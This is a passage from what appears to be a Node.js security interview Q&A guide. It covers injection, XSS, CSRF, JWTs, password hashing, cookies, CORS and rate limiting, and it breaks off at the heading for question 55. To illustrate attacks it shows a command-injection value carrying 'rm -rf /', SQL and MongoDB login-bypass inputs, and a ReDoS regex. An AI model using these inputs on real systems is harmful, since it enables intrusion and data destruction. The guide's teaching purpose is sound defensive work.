- [315: How do you check the IP at connection time to stop SSRF with DNS rebinding?](#315-how-do-you-check-the-ip-at-connection-time-to-stop-ssrf-with-dns-rebinding)
- [316: Which URL tricks do attackers use to bypass SSRF blocklists?](#316-which-url-tricks-do-attackers-use-to-bypass-ssrf-blocklists)
- [317: Why is timingSafeEqual on raw tokens still sometimes leaky, and how do you fix it?](#317-why-is-timingsafeequal-on-raw-tokens-still-sometimes-leaky-and-how-do-you-fix-it)
- [318: What are kid, jku and x5u header attacks on JWTs?](#318-what-are-kid-jku-and-x5u-header-attacks-on-jwts)
- [319: How do you verify tokens from an identity provider with key rotation?](#319-how-do-you-verify-tokens-from-an-identity-provider-with-key-rotation)
- [320: What is DPoP and what problem does it solve?](#320-what-is-dpop-and-what-problem-does-it-solve)
- [321: How do you choose between server sessions and stateless JWTs for a Node.js app?](#321-how-do-you-choose-between-server-sessions-and-stateless-jwts-for-a-nodejs-app)
- [322: Why must OAuth redirect URIs be matched exactly?](#322-why-must-oauth-redirect-uris-be-matched-exactly)
- [323: What is an OAuth mix-up attack and how is it prevented?](#323-what-is-an-oauth-mix-up-attack-and-how-is-it-prevented)
- [324: What must the server store and check when implementing passkeys?](#324-what-must-the-server-store-and-check-when-implementing-passkeys)
- [325: What is step-up authentication?](#325-what-is-step-up-authentication)
- [326: When would you use a policy engine like OPA or Cedar instead of code checks?](#326-when-would-you-use-a-policy-engine-like-opa-or-cedar-instead-of-code-checks)
- [327: How do you enforce tenant isolation in a multi-tenant Node.js API?](#327-how-do-you-enforce-tenant-isolation-in-a-multi-tenant-nodejs-api)
- [328: How do you use Postgres row-level security safely with a Node.js connection pool?](#328-how-do-you-use-postgres-row-level-security-safely-with-a-nodejs-connection-pool)
- [329: How did the node-serialize vulnerability work?](#329-how-did-the-node-serialize-vulnerability-work)
- [330: Why is passing req.query or req.body to res.render dangerous?](#330-why-is-passing-reqquery-or-reqbody-to-resrender-dangerous)
- [331: Show how code can escape a node:vm context.](#331-show-how-code-can-escape-a-nodevm-context)
- [332: How does the permission model compare with containers and seccomp?](#332-how-does-the-permission-model-compare-with-containers-and-seccomp)
- [333: Describe some well-known npm supply chain attacks and what they teach.](#333-describe-some-well-known-npm-supply-chain-attacks-and-what-they-teach)
- [334: What is trusted publishing on npm?](#334-what-is-trusted-publishing-on-npm)
- [335: What is a dependency confusion attack?](#335-what-is-a-dependency-confusion-attack)
- [336: What is lockfile injection and how do you catch it?](#336-what-is-lockfile-injection-and-how-do-you-catch-it)
- [337: What are SLSA and Sigstore?](#337-what-are-slsa-and-sigstore)
- [338: What is VEX and how does it relate to an SBOM?](#338-what-is-vex-and-how-does-it-relate-to-an-sbom)
- [339: How do you reduce the blast radius if a dependency turns malicious?](#339-how-do-you-reduce-the-blast-radius-if-a-dependency-turns-malicious)
- [340: How would you detect a malicious dependency update before it reaches production?](#340-how-would-you-detect-a-malicious-dependency-update-before-it-reaches-production)
- [341: Why are native addons a special supply chain risk?](#341-why-are-native-addons-a-special-supply-chain-risk)
- [342: How do you design secrets management for a fleet of Node.js services?](#342-how-do-you-design-secrets-management-for-a-fleet-of-nodejs-services)
- [343: What is envelope encryption?](#343-what-is-envelope-encryption)
- [344: How do you implement field-level encryption for sensitive columns in a Node.js app?](#344-how-do-you-implement-field-level-encryption-for-sensitive-columns-in-a-nodejs-app)
- [345: How does a Node.js process get a good source of randomness?](#345-how-does-a-nodejs-process-get-a-good-source-of-randomness)
- [346: What is the difference between AES-GCM and AES-CBC with HMAC, and which should you use?](#346-what-is-the-difference-between-aes-gcm-and-aes-cbc-with-hmac-and-which-should-you-use)
- [347: Why should you prefer libraries like jose or libsodium wrappers over hand-written crypto?](#347-why-should-you-prefer-libraries-like-jose-or-libsodium-wrappers-over-hand-written-crypto)
- [348: How do you handle TLS certificate rotation in a long-running Node.js server?](#348-how-do-you-handle-tls-certificate-rotation-in-a-long-running-nodejs-server)
- [349: What are the trade-offs of certificate pinning in a Node.js client?](#349-what-are-the-trade-offs-of-certificate-pinning-in-a-nodejs-client)
- [350: How do you make outgoing HTTP requests from Node.js safer by default?](#350-how-do-you-make-outgoing-http-requests-from-nodejs-safer-by-default)
- [351: What is log injection and how do structured logs help?](#351-what-is-log-injection-and-how-do-structured-logs-help)
- [352: How do you keep personal data out of traces and metrics?](#352-how-do-you-keep-personal-data-out-of-traces-and-metrics)
- [353: What is the difference between operational errors and programmer errors, and why does it matter for security?](#353-what-is-the-difference-between-operational-errors-and-programmer-errors-and-why-does-it-matter-for-security)
- [354: How should an auth middleware behave when its backing store is down?](#354-how-should-an-auth-middleware-behave-when-its-backing-store-is-down)
- [355: How do race conditions cause security bugs in Node.js apps?](#355-how-do-race-conditions-cause-security-bugs-in-nodejs-apps)
- [356: How do idempotency keys help security and reliability?](#356-how-do-idempotency-keys-help-security-and-reliability)
- [357: How can attackers bypass IP-based rate limiting, and how do you prevent it?](#357-how-can-attackers-bypass-ip-based-rate-limiting-and-how-do-you-prevent-it)
- [358: Why should you not put access tokens in WebSocket URLs, and what is the alternative?](#358-why-should-you-not-put-access-tokens-in-websocket-urls-and-what-is-the-alternative)
- [359: How do you handle token expiry and revocation on long-lived WebSocket connections?](#359-how-do-you-handle-token-expiry-and-revocation-on-long-lived-websocket-connections)
- [360: Why should you turn off field suggestions in a production GraphQL API?](#360-why-should-you-turn-off-field-suggestions-in-a-production-graphql-api)
- [361: How do you secure GraphQL subscriptions?](#361-how-do-you-secure-graphql-subscriptions)
- [362: How can DataLoader leak data between users?](#362-how-can-dataloader-leak-data-between-users)
- [363: How can HTTP caching leak private data?](#363-how-can-http-caching-leak-private-data)
- [364: What are web cache poisoning and web cache deception?](#364-what-are-web-cache-poisoning-and-web-cache-deception)
- [365: How can serializing server state into HTML cause XSS in SSR apps?](#365-how-can-serializing-server-state-into-html-cause-xss-in-ssr-apps)
- [366: What is strict-dynamic in CSP and why is it useful?](#366-what-is-strict-dynamic-in-csp-and-why-is-it-useful)
- [367: What are Trusted Types?](#367-what-are-trusted-types)
- [368: How do you render user Markdown safely on a Node.js server?](#368-how-do-you-render-user-markdown-safely-on-a-nodejs-server)
- [369: Why are SVG uploads dangerous?](#369-why-are-svg-uploads-dangerous)
- [370: What risks come with generating PDFs from user HTML with Puppeteer or Playwright?](#370-what-risks-come-with-generating-pdfs-from-user-html-with-puppeteer-or-playwright)
- [371: What is CSV injection?](#371-what-is-csv-injection)
- [372: What is XXE and how do you avoid it in Node.js XML parsing?](#372-what-is-xxe-and-how-do-you-avoid-it-in-nodejs-xml-parsing)
- [373: How do you stop login timing from revealing whether an account exists?](#373-how-do-you-stop-login-timing-from-revealing-whether-an-account-exists)
- [374: How do you restrict outbound network traffic from Node.js pods?](#374-how-do-you-restrict-outbound-network-traffic-from-nodejs-pods)
- [375: What is --frozen-intrinsics?](#375-what-is---frozen-intrinsics)
- [376: What happened to the Node.js policy feature?](#376-what-happened-to-the-nodejs-policy-feature)
- [377: How would you design brute-force protection for a large login system?](#377-how-would-you-design-brute-force-protection-for-a-large-login-system)
- [378: How do you check a password against breached password lists without sending the password?](#378-how-do-you-check-a-password-against-breached-password-lists-without-sending-the-password)
- [379: How do you design a secure password reset flow end to end?](#379-how-do-you-design-a-secure-password-reset-flow-end-to-end)
- [380: How should MFA recovery codes be generated and stored?](#380-how-should-mfa-recovery-codes-be-generated-and-stored)
- [381: How do you implement TOTP verification safely?](#381-how-do-you-implement-totp-verification-safely)
- [382: What is session hijacking and how do you detect it?](#382-what-is-session-hijacking-and-how-do-you-detect-it)
- [383: How do you build a "log out from all devices" feature?](#383-how-do-you-build-a-log-out-from-all-devices-feature)
- [384: Why is it risky to trust claims from an ID token for authorization in your API?](#384-why-is-it-risky-to-trust-claims-from-an-id-token-for-authorization-in-your-api)
- [385: How do you safely support "Sign in with Google" and link it to existing accounts?](#385-how-do-you-safely-support-sign-in-with-google-and-link-it-to-existing-accounts)
- [386: What is account takeover through a pre-hijacking attack?](#386-what-is-account-takeover-through-a-pre-hijacking-attack)
- [387: How do you safely implement "impersonate user" for support staff?](#387-how-do-you-safely-implement-impersonate-user-for-support-staff)
- [388: How do you design authorization checks so they are hard to forget?](#388-how-do-you-design-authorization-checks-so-they-are-hard-to-forget)
- [389: What is BOLA and why is it the top API risk?](#389-what-is-bola-and-why-is-it-the-top-api-risk)
- [390: What is broken function level authorization?](#390-what-is-broken-function-level-authorization)
- [391: How do you protect against mass data scraping through a legitimate API?](#391-how-do-you-protect-against-mass-data-scraping-through-a-legitimate-api)
- [392: How should an API handle large result sets securely?](#392-how-should-an-api-handle-large-result-sets-securely)
- [393: How do signed URLs work for private file downloads?](#393-how-do-signed-urls-work-for-private-file-downloads)
- [394: How do you secure presigned upload URLs?](#394-how-do-you-secure-presigned-upload-urls)
- [395: How do you scan uploaded files for malware in a Node.js pipeline?](#395-how-do-you-scan-uploaded-files-for-malware-in-a-nodejs-pipeline)
- [396: Why should image processing run in a separate worker or service?](#396-why-should-image-processing-run-in-a-separate-worker-or-service)
- [397: What are the risks of using child_process to call tools like ImageMagick or ffmpeg?](#397-what-are-the-risks-of-using-child_process-to-call-tools-like-imagemagick-or-ffmpeg)
- [398: How does Node.js handle null bytes in file paths, and why does it matter?](#398-how-does-nodejs-handle-null-bytes-in-file-paths-and-why-does-it-matter)
- [399: What is the risk of following symlinks when serving static files?](#399-what-is-the-risk-of-following-symlinks-when-serving-static-files)
- [400: How do you limit what a compromised Node.js process can read on disk?](#400-how-do-you-limit-what-a-compromised-nodejs-process-can-read-on-disk)
- [401: How does coverage-guided fuzzing work, and what would you fuzz in a Node.js app?](#401-how-does-coverage-guided-fuzzing-work-and-what-would-you-fuzz-in-a-nodejs-app)
- [402: How do you write a fuzz target for a Node.js function?](#402-how-do-you-write-a-fuzz-target-for-a-nodejs-function)
- [403: How do you fit SAST, DAST, SCA and fuzzing into one pipeline without slowing teams down?](#403-how-do-you-fit-sast-dast-sca-and-fuzzing-into-one-pipeline-without-slowing-teams-down)
- [404: How do you reduce false positives from security scanners?](#404-how-do-you-reduce-false-positives-from-security-scanners)
- [405: What is reachability analysis in dependency scanning?](#405-what-is-reachability-analysis-in-dependency-scanning)
- [406: How do you run a threat model for a new Node.js feature like file sharing?](#406-how-do-you-run-a-threat-model-for-a-new-nodejs-feature-like-file-sharing)
- [407: Walk through what you do in the first hour after finding out an npm token was stolen.](#407-walk-through-what-you-do-in-the-first-hour-after-finding-out-an-npm-token-was-stolen)
- [408: What are the phases of incident response?](#408-what-are-the-phases-of-incident-response)
- [409: How do you contain a compromised Node.js service without destroying evidence?](#409-how-do-you-contain-a-compromised-nodejs-service-without-destroying-evidence)
- [410: What logs do you need ready before an incident happens?](#410-what-logs-do-you-need-ready-before-an-incident-happens)
- [411: How should a team handle a vulnerability reported in its own Node.js open-source package?](#411-how-should-a-team-handle-a-vulnerability-reported-in-its-own-nodejs-open-source-package)
- [412: How does the Node.js project manage security releases?](#412-how-does-the-nodejs-project-manage-security-releases)
- [413: How do you plan for Node.js security releases in a large organization?](#413-how-do-you-plan-for-nodejs-security-releases-in-a-large-organization)
- [414: How do you decide how fast to patch a dependency vulnerability?](#414-how-do-you-decide-how-fast-to-patch-a-dependency-vulnerability)
- [415: How would you secure a Node.js app that must accept webhooks from many third parties?](#415-how-would-you-secure-a-nodejs-app-that-must-accept-webhooks-from-many-third-parties)
- [416: How do you prevent replay attacks on signed requests?](#416-how-do-you-prevent-replay-attacks-on-signed-requests)
- [417: How do you secure service-to-service calls inside a Node.js microservices system?](#417-how-do-you-secure-service-to-service-calls-inside-a-nodejs-microservices-system)
- [418: Why should internal services not trust headers like X-User-Id?](#418-why-should-internal-services-not-trust-headers-like-x-user-id)
- [419: How do you design an API gateway's security responsibilities versus the services behind it?](#419-how-do-you-design-an-api-gateways-security-responsibilities-versus-the-services-behind-it)
- [420: How would you approach securing a legacy Express 4 app you just inherited?](#420-how-would-you-approach-securing-a-legacy-express-4-app-you-just-inherited)
- [421: An endpoint takes 30 seconds on certain inputs and the CPU is at 100 percent. How do you investigate?](#421-an-endpoint-takes-30-seconds-on-certain-inputs-and-the-cpu-is-at-100-percent-how-do-you-investigate)
- [422: A security scanner reports your API allows any origin with credentials. How do you fix it safely?](#422-a-security-scanner-reports-your-api-allows-any-origin-with-credentials-how-do-you-fix-it-safely)
- [423: You find user passwords hashed with unsalted SHA-1 in an old database. What do you do?](#423-you-find-user-passwords-hashed-with-unsalted-sha-1-in-an-old-database-what-do-you-do)
- [424: How would you design rate limiting for an expensive AI or report generation endpoint?](#424-how-would-you-design-rate-limiting-for-an-expensive-ai-or-report-generation-endpoint)
- [425: How would you protect a public GraphQL API from abuse end to end?](#425-how-would-you-protect-a-public-graphql-api-from-abuse-end-to-end)
- [426: What are the main risks when running server-side JavaScript plugins written by customers?](#426-what-are-the-main-risks-when-running-server-side-javascript-plugins-written-by-customers)
- [427: How can WebAssembly help sandbox untrusted logic in Node.js?](#427-how-can-webassembly-help-sandbox-untrusted-logic-in-nodejs)
- [428: What security checks would you add before deploying a Node.js service to production?](#428-what-security-checks-would-you-add-before-deploying-a-nodejs-service-to-production)
- [429: How do you keep secrets out of Node.js heap snapshots and core dumps?](#429-how-do-you-keep-secrets-out-of-nodejs-heap-snapshots-and-core-dumps)
- [430: Why is running npm start or npx at runtime a supply chain concern in production containers?](#430-why-is-running-npm-start-or-npx-at-runtime-a-supply-chain-concern-in-production-containers)
- [431: How do you verify the integrity of what you deploy?](#431-how-do-you-verify-the-integrity-of-what-you-deploy)
- [432: What is a software bill of materials used for during an incident like Log4Shell or a malicious npm version?](#432-what-is-a-software-bill-of-materials-used-for-during-an-incident-like-log4shell-or-a-malicious-npm-version)
- [433: How do you handle a zero-day in Node.js itself before a patch is available?](#433-how-do-you-handle-a-zero-day-in-nodejs-itself-before-a-patch-is-available)
- [434: What role does a WAF play in front of a Node.js app, and what are its limits?](#434-what-role-does-a-waf-play-in-front-of-a-nodejs-app-and-what-are-its-limits)
- [435: How do you make sure security fixes do not regress later?](#435-how-do-you-make-sure-security-fixes-do-not-regress-later)
- [436: How would you test for timing leaks in an authentication endpoint?](#436-how-would-you-test-for-timing-leaks-in-an-authentication-endpoint)
- [437: How do you check that security headers are always sent, including on error responses?](#437-how-do-you-check-that-security-headers-are-always-sent-including-on-error-responses)
- [438: How should a Node.js app shut down to avoid security and data problems?](#438-how-should-a-nodejs-app-shut-down-to-avoid-security-and-data-problems)
- [439: How do you design audit logging for admin actions in a Node.js back end?](#439-how-do-you-design-audit-logging-for-admin-actions-in-a-nodejs-back-end)
- [440: How would you secure a Node.js CLI tool your company distributes to developers?](#440-how-would-you-secure-a-nodejs-cli-tool-your-company-distributes-to-developers)
- [441: How can a malicious repository attack a developer who runs a Node.js tool inside it?](#441-how-can-a-malicious-repository-attack-a-developer-who-runs-a-nodejs-tool-inside-it)
- [442: How do you limit damage from a compromised developer laptop in a Node.js team?](#442-how-do-you-limit-damage-from-a-compromised-developer-laptop-in-a-nodejs-team)
- [443: How would you build an internal allowlist or review process for new npm dependencies?](#443-how-would-you-build-an-internal-allowlist-or-review-process-for-new-npm-dependencies)
- [444: What is the trade-off between pinning exact dependency versions and using ranges?](#444-what-is-the-trade-off-between-pinning-exact-dependency-versions-and-using-ranges)
- [445: How do you protect an app against a compromised CDN-hosted front-end library?](#445-how-do-you-protect-an-app-against-a-compromised-cdn-hosted-front-end-library)
- [446: How do you evaluate the security of a new Node.js framework or runtime alternative?](#446-how-do-you-evaluate-the-security-of-a-new-nodejs-framework-or-runtime-alternative)
- [447: Scenario: logs show many requests with payloads like {"$gt": ""} to the login endpoint. What does this tell you and what do you do?](#447-scenario-logs-show-many-requests-with-payloads-like-gt--to-the-login-endpoint-what-does-this-tell-you-and-what-do-you-do)
- [448: Scenario: a dependency update suddenly adds a postinstall script that downloads a binary. How do you respond?](#448-scenario-a-dependency-update-suddenly-adds-a-postinstall-script-that-downloads-a-binary-how-do-you-respond)
- [449: Scenario: you must add file preview for PDFs uploaded by users. What security design do you propose?](#449-scenario-you-must-add-file-preview-for-pdfs-uploaded-by-users-what-security-design-do-you-propose)
- [450: If you had one week to improve the security of a mid-size Node.js API, what would you prioritize?](#450-if-you-had-one-week-to-improve-the-security-of-a-mid-size-nodejs-api-what-would-you-prioritize)

---

# Easy Questions (1-150)

## 1: Why does Node.js security need its own attention compared to other back ends?

Most web security problems (injection, broken auth, XSS) are the same in every language. Node.js adds a few of its own:

- A single thread runs all JavaScript, so one slow request (a bad regex, a huge JSON body) can block every other user.
- Apps pull in hundreds of npm packages, and each one runs with the full rights of your process.
- JavaScript objects share a prototype, which opens the door to prototype pollution.
- Functions like `eval`, `vm` and `child_process` make it easy to run untrusted code by mistake.

## 2: What is the OWASP Top 10?

It is a list of the ten most common and serious web application security risks, published by the Open Worldwide Application Security Project. Teams use it as a checklist for training, code reviews and testing. The current edition is the OWASP Top 10:2025, finalized in early 2026.

## 3: What are the categories in the OWASP Top 10:2025?

1. A01 Broken Access Control
2. A02 Security Misconfiguration
3. A03 Software Supply Chain Failures
4. A04 Cryptographic Failures
5. A05 Injection
6. A06 Insecure Design
7. A07 Authentication Failures
8. A08 Software or Data Integrity Failures
9. A09 Security Logging and Alerting Failures
10. A10 Mishandling of Exceptional Conditions

SSRF, which had its own spot in 2021, is now part of Broken Access Control.

## 4: What is the difference between authentication and authorization?

Authentication checks who the user is, for example by password, passkey or a login with Google. Authorization checks what that user is allowed to do, for example whether they can delete this order. You always authenticate first, then authorize every action.

## 5: What is input validation?

Input validation means checking that data coming into your app has the expected type, length, format and range before you use it. Everything from the outside counts as input: body, query string, URL params, headers, cookies, files, and even data from other services. Invalid input should be rejected with a 400 error.

## 6: What is the difference between validation and sanitization?

Validation decides whether input is acceptable and rejects it if not. Sanitization changes the input to make it safe, for example by stripping HTML tags. Validation is usually the safer first choice, because changing data can hide problems. Sanitize only when you must accept something like rich text.

## 7: Why should you prefer an allowlist over a denylist?

An allowlist says exactly what is allowed (for example, only letters and digits, 3 to 30 characters). A denylist tries to block known bad values (for example, `<script>`). Attackers keep finding ways around denylists with encoding tricks and new payloads, while an allowlist stays safe even against attacks you did not think of.

## 8: How do you validate a request body in Express with Zod?

```js
import express from "express";
import { z } from "zod";

const app = express();
app.use(express.json({ limit: "10kb" }));

const SignupSchema = z.strictObject({
  email: z.email(),
  name: z.string().min(1).max(100),
  age: z.number().int().min(13).max(120),
});

app.post("/signup", (req, res) => {
  const result = SignupSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ error: "Invalid input" });
  }
  const { email, name, age } = result.data; // typed and checked
  res.status(201).json({ email, name, age });
});
```

`z.strictObject` also rejects unknown keys, so extra fields like `isAdmin` cannot sneak in.

## 9: What is an injection attack?

An injection attack happens when user input is treated as code or as part of a command instead of plain data. The classic example is SQL injection, but the same idea applies to NoSQL queries, shell commands, LDAP filters, HTML (XSS) and template engines. The fix is to keep data and code apart, usually with parameterized APIs.

## 10: What is SQL injection?

SQL injection happens when user input is glued into a SQL string, so the attacker can change the query. With `'SELECT * FROM users WHERE email = '' + email + '''`, the input `' OR '1'='1` returns every user. Attackers can read, change or delete data, and sometimes run commands on the database server.

## 11: How do you prevent SQL injection in Node.js?

Use parameterized queries (also called prepared statements). The driver sends the query and the values separately, so values can never change the query structure.

```js
import pg from "pg";
const pool = new pg.Pool();

const { rows } = await pool.query(
  "SELECT id, email FROM users WHERE email = $1",
  [req.body.email],
);
```

ORMs and query builders (Prisma, Drizzle, Knex, Sequelize) parameterize for you, as long as you do not use their raw string methods with concatenation.

## 12: What is NoSQL injection?

NoSQL injection happens when attackers send query operators instead of plain values. In MongoDB, a login query like `User.findOne({ email, password })` can be broken by sending `{ "password": { "$ne": null } }` in a JSON body, which matches any password. The fix is to check that each value is the type you expect, for example a string.

## 13: What is command injection?

Command injection happens when user input ends up in a shell command. For example, `exec('ping ' + host)` with `host = "8.8.8.8; rm -rf /"` runs a second command. In Node.js, avoid `exec` with user input and use `execFile` or `spawn` with an argument array, which do not start a shell.

## 14: What is XSS?

Cross-site scripting (XSS) is when an attacker gets their JavaScript to run in another user's browser on your site. This lets them steal data, act as that user or change the page. It usually happens when the server or the front end puts user input into HTML without escaping it.

## 15: What are the three main types of XSS?

- **Stored XSS:** the payload is saved (for example in a comment) and shown to every visitor.
- **Reflected XSS:** the payload comes from the request (for example a search query) and is echoed right back in the response.
- **DOM-based XSS:** front-end JavaScript takes data from the URL or another source and writes it into the page with something like `innerHTML`.

## 16: How do you prevent XSS on a Node.js server that renders HTML?

Use a template engine that escapes output by default, such as EJS with `<%= %>`, Pug or Handlebars with `{{ }}`. Do not use the raw output tags (`<%- %>`, `{{{ }}}`, `!{}`) with user data. Add a Content Security Policy as a second layer, and set the right `Content-Type` on responses.

## 17: What is CSRF?

Cross-site request forgery tricks a logged-in user's browser into sending a request to your site from another site. Because the browser attaches cookies automatically, the request looks real. For example, a hidden form on an evil page could post to `/transfer` on your bank site.

## 18: How do you protect against CSRF?

- Set session cookies with `SameSite=Lax` or `SameSite=Strict`.
- Use CSRF tokens for forms and state-changing requests.
- Check the `Origin` header (or `Sec-Fetch-Site`) on POST, PUT, PATCH and DELETE.
- Never change state on GET requests.

APIs that use `Authorization: Bearer` headers instead of cookies are not exposed to classic CSRF, because the browser does not add that header by itself.

## 19: What is a session?

A session is a way to remember a user between requests. After login, the server creates a session record (in memory, Redis or a database) and sends the browser a random session ID in a cookie. On each request, the server looks up the session by that ID.

## 20: What is a JWT?

A JSON Web Token is a signed string with three parts separated by dots: header, payload and signature. The payload holds claims such as the user ID and expiry time. The server checks the signature to make sure the token was not changed. A normal JWT is signed, not encrypted, so anyone can read the payload.

## 21: Should you put sensitive data inside a JWT payload?

No. The payload is only base64url-encoded, so anyone with the token can decode and read it. Put only what you need for authorization, such as the user ID, role and expiry. If you really need to hide the content, use an encrypted token (JWE), but it is usually simpler to keep data on the server.

## 22: How do you sign and verify a JWT in Node.js?

With the `jose` library:

```js
import { SignJWT, jwtVerify } from "jose";

const secret = new TextEncoder().encode(process.env.JWT_SECRET);

const token = await new SignJWT({ role: "user" })
  .setProtectedHeader({ alg: "HS256" })
  .setSubject("user-123")
  .setIssuedAt()
  .setExpirationTime("15m")
  .sign(secret);

const { payload } = await jwtVerify(token, secret, {
  algorithms: ["HS256"],
});
console.log(payload.sub); // "user-123"
```

`jsonwebtoken` is also widely used and works the same way with `jwt.sign` and `jwt.verify`.

## 23: Why should you never store passwords in plain text?

If the database leaks, every password is exposed right away. Since people reuse passwords, attackers can then log in to their email, bank and other accounts. Store only a slow, salted password hash instead.

## 24: Why are MD5 and SHA-256 bad for storing passwords?

They are designed to be fast. A modern GPU can try billions of SHA-256 guesses per second, so short or common passwords fall quickly. Password hashing needs a deliberately slow function with a salt, such as Argon2id, scrypt or bcrypt.

## 25: What is a salt?

A salt is a random value added to each password before hashing. It makes two users with the same password get different hashes, and it stops attackers from using precomputed tables (rainbow tables). The salt is not secret and is stored next to the hash. bcrypt, scrypt and Argon2 libraries handle it for you.

## 26: How do you hash a password with bcrypt?

```js
import bcrypt from "bcrypt";

const hash = await bcrypt.hash(password, 12); // cost factor 12
const ok = await bcrypt.compare(loginPassword, hash);
```

The cost factor controls how slow hashing is. Each +1 doubles the work. Use the async functions so you do not block the event loop.

## 27: How do you hash a password with Argon2?

```js
import argon2 from "argon2";

const hash = await argon2.hash(password); // argon2id by default
const ok = await argon2.verify(hash, loginPassword);
```

The stored hash string includes the algorithm, parameters and salt, so you only save one value.

## 28: Which password hashing algorithm does OWASP recommend first?

OWASP recommends Argon2id first. If it is not available, use scrypt, then bcrypt for older systems. PBKDF2 is used where FIPS-140 compliance is required. All of them are much better than plain hash functions.

## 29: What is RBAC?

Role-based access control gives users roles (such as `admin`, `editor`, `viewer`) and gives each role a set of permissions. To check access, you look at the user's role. It is simple and works well when permissions map neatly to job types.

## 30: What is ABAC?

Attribute-based access control decides access from attributes of the user, the resource, the action and the context. For example: "a user can edit a document if they are its owner and the document is not locked." It is more flexible than RBAC but harder to reason about and test.

## 31: What is broken access control?

It means users can do things they should not, such as view another user's data, change their own role or call admin endpoints. It is the number one risk in the OWASP Top 10:2025. A common cause is checking only that the user is logged in, but not whether they own the resource.

## 32: What is IDOR?

Insecure direct object reference is when an endpoint takes an ID from the user and returns the object without checking ownership. For example, `GET /api/invoices/1043` returns any invoice if you change the number. The fix is to always filter by the current user, like `WHERE id = $1 AND owner_id = $2`.

## 33: What is a cookie and why does its configuration matter for security?

A cookie is a small value the server asks the browser to store and send back on later requests. Session IDs and tokens are often stored in cookies, so a badly configured cookie can be stolen by JavaScript, sent over plain HTTP or sent along with cross-site requests. Cookie flags control all of this.

## 34: What does the HttpOnly cookie flag do?

It stops JavaScript in the page from reading the cookie through `document.cookie`. If an XSS bug exists, the attacker cannot simply read and send away the session cookie. Session cookies should always be `HttpOnly`.

## 35: What does the Secure cookie flag do?

It tells the browser to send the cookie only over HTTPS. Without it, the cookie could leak on any plain HTTP request, for example on public Wi-Fi. All auth cookies should be `Secure`.

## 36: What does the SameSite cookie attribute do?

It controls whether the browser sends the cookie on requests coming from other sites:

- `Strict`: never sent on cross-site requests.
- `Lax`: sent on top-level GET navigations (clicking a link), not on cross-site POSTs or fetches. Most browsers treat cookies as `Lax` when the attribute is missing.
- `None`: always sent, but must also be `Secure`.

`Lax` or `Strict` blocks most CSRF attacks.

## 37: How do you set a secure cookie in Express?

```js
res.cookie("sid", sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: "lax",
  path: "/",
  maxAge: 1000 * 60 * 60 * 8, // 8 hours
});
```

## 38: What are HTTP security headers?

They are response headers that tell the browser to turn on extra protections. Examples are `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options` and `Referrer-Policy`. They do not fix bugs in your code, but they make many attacks harder.

## 39: What is Helmet?

Helmet is an Express middleware package that sets a group of security headers with safe defaults in one line. It sets headers like CSP, HSTS, `X-Content-Type-Options: nosniff` and `X-Frame-Options`, and removes `X-Powered-By`. For Fastify, the matching plugin is `@fastify/helmet`.

```js
import helmet from "helmet";
app.use(helmet());
```

## 40: What is a Content Security Policy?

CSP is a header that tells the browser where scripts, styles, images and other resources may load from. For example, `script-src 'self'` blocks inline scripts and scripts from other domains. If an attacker injects a `<script>` tag, the browser refuses to run it. It is a strong second line of defense against XSS.

## 41: What is HSTS?

HTTP Strict Transport Security is the `Strict-Transport-Security` header. It tells the browser to use only HTTPS for your domain for a set time, even if the user types `http://`. This stops SSL stripping attacks where a man in the middle keeps the user on plain HTTP.

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

## 42: What does X-Content-Type-Options: nosniff do?

It stops the browser from guessing (sniffing) the content type of a response. Without it, a file uploaded as `image/png` that actually contains HTML or JavaScript could be run as a script. With `nosniff`, the browser trusts the `Content-Type` you send.

## 43: What is clickjacking and how do you prevent it?

Clickjacking loads your site in an invisible iframe on an attacker's page and tricks the user into clicking buttons on it. You prevent it with `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`), and with the older `X-Frame-Options: DENY` header for old browsers. Helmet sets both.

## 44: What is CORS?

Cross-Origin Resource Sharing is a browser mechanism that lets a server say which other origins may read its responses with JavaScript. By default, the same-origin policy blocks a page on `a.com` from reading a response from `b.com`. CORS headers like `Access-Control-Allow-Origin` relax that rule for chosen origins.

## 45: Is CORS a security feature that protects your server?

Not really. CORS protects users' browsers by controlling which sites may read responses. It does not stop requests from reaching your server, and tools like curl ignore it completely. You still need authentication, authorization and CSRF protection on the server.

## 46: How do you configure CORS in Express?

```js
import cors from "cors";

app.use(
  cors({
    origin: ["https://app.example.com", "https://admin.example.com"],
    credentials: true,
    methods: ["GET", "POST", "PUT", "DELETE"],
  }),
);
```

List exact origins. Do not reflect any incoming origin when `credentials` is `true`.

## 47: What is rate limiting?

Rate limiting caps how many requests a client can make in a time window, for example 100 requests per 15 minutes per IP. It slows down brute-force attacks, credential stuffing, scraping and simple denial-of-service attempts. Clients over the limit get `429 Too Many Requests`.

## 48: How do you add rate limiting to an Express app?

```js
import { rateLimit } from "express-rate-limit";

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 100,
  standardHeaders: "draft-8",
  legacyHeaders: false,
});

app.use("/api", limiter);
```

For more than one server, use a shared store like Redis so all instances count together.

## 49: What is a brute-force attack?

The attacker tries many passwords (or codes, or tokens) until one works. Defenses include rate limiting, slowing down after failed attempts, temporary lockouts, CAPTCHAs, multi-factor authentication and strong password rules.

## 50: What is credential stuffing?

Attackers take username and password pairs leaked from other sites and try them on your login page. Because people reuse passwords, some will work. Defenses include MFA, rate limiting by IP and by account, checking passwords against known breach lists, and bot detection.

## 51: What is ReDoS?

Regular expression denial of service. Some regexes take exponential time on certain inputs because the engine backtracks through many ways to match. Since Node.js runs JavaScript on one thread, one request with a crafted string can freeze the whole server for seconds or minutes.

## 52: Give an example of a regex that is vulnerable to ReDoS.

```js
const bad = /^(a+)+$/;
bad.test("a".repeat(30) + "!"); // takes a very long time
```

The nested quantifier `(a+)+` lets the engine split the `a`s in a huge number of ways before it gives up. Patterns like `(a|a)*`, `(.*a){10}` and `(\w+\s?)*$` have the same problem.

## 53: Why can one slow request take down a whole Node.js server?

Node.js runs your JavaScript on a single main thread with an event loop. While one piece of code runs, nothing else can run: no other requests, no timers, no I/O callbacks. A long synchronous task, like a heavy regex, a big `JSON.parse` or a sync crypto call, blocks every user until it finishes.

## 54: What is a denial-of-service (DoS) attack?

A DoS attack tries to make a service unavailable to real users. It can flood the server with traffic, exhaust memory or connections, or send a few requests that are very expensive to process. A distributed DoS (DDoS) uses many machines at once.

## 55: What is prototype pollution?

